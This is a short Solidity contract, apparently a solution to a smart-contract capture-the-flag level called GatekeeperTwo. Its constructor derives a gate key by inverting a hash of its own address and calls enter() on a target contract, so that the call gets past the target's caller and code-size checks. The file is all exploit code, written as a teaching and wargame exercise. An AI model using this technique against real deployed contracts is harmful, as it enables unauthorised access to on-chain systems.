// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract MyGateKeeper2Attack {
    constructor(address target) {
        // constructing _gateKey
        // idea is that val XOR (NOT val) => all bits set
        uint64 val = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 key = bytes8(~val);

        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", key);
        target.call(payload);
    }
}
